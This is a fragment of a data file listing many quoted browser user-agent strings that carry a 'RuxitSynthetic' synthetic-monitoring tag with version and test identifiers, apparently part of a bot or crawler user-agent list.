            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v1812572422318983098 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904288226 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v8270212117464261238 t7875107314671608997 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898009820 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2901588809456252067 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904296906 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v2987665832522296741 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5399361883476228335 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904307572 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904309408 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904312050 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7360812492496690968 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v5423213463774253870 t7735927178140269288 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898092210 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904320729 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v8882357967817753520 t2272431400758753269 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v1912197743464510655 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v4864984384606576507 t144310210871017869 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5158145981495984240 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v7158447729084174907 t961549258186996299 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3569233632505726841 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904331386 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904333222 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898147281 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v576153182523273674 t6450448904627200820 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904335860 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v3120103700536776668 t6735075811151450244 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904343890 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v921185465685600066 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904354552 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4386165383444415031 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904356384 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898226940 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904359025 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v8949811842818158635 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3445413620894572867 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2789194426226356551 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v3941037457149491314 t1773489522052420014 ath259cea6f altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904367710 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5749267051042599394 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898282003 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v4361523732831103881 t8542737954275332693 ath93eb305d altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904378375 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4598182692746338809 t2258199849751664265 ath4b3726d5 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904380209 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v3317650786331066727 t8161287340496183299 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904382850 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v6583016642156558644 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8097048728053199473 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904391535 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898364384 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v3905907578959558970 t2728041645536310993 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v1319480782627565154 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904402196 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904404031 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v1612392799836406769 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904406674 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898397611 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v6174680185722636898 t7875107314671608997 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898419451 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2129853279438372074 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904415349 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v8687452651847660676 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6441541559138629244 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904426014 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904427850 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904430491 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v1660985758815800078 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v6193313728376191032 t7735927178140269288 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898501842 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904439172 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v897298239147458756 t2272431400758753269 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8686706046972748281 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v3035322511164772735 t144310210871017869 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v6811593466960023348 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v716211433668863730 t961549258186996299 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v216199422618529222 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904449831 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904451667 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898556908 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904454306 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v745444070019788719 t6450448904627200820 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v1419859588358589545 t6735075811151450244 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904462336 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v4412705599343399436 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904473003 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v6006216282235402451 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904474834 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898636569 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904477473 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v1191019463893982364 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v8042629239476489546 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v992796286886995328 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v5465064830322049690 t1773489522052420014 ath259cea6f altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904486159 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2149489725246592168 t2396787350312843847 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898691634 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2194941206170682721 t8542737954275332693 ath93eb305d altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904496820 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4041629102642121032 t2258199849751664265 ath4b3726d5 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904498656 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2526232998317131216 t8161287340496183299 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904501294 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v5003150034259710083 t1872217365388251660 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5090847518822462374 t6182751287436097174 athe94ac249 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904509977 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898774019 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v1315940511523560321 t2728041645536310993 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v646225890446747503 t1575875634589018017 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904520639 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904522475 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v8815717589968608266 t7585821862018737939 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904525116 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 RuxitSynthetic/1.0 v7407945122317741622 t7875107314671608997 ath2653ab72 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v11898829083 t1198600188870445864 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v3064421517183677537 t2292540608630398113 ath1fb31b7a altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904533796 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v15421921019366880 t1058358641252769813 ath5ee645e0 altpriv cvcv=2 smf=0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v3904544462 t6539152303194725765 athfa3c3975 altpub cvcv=2 smf=0',
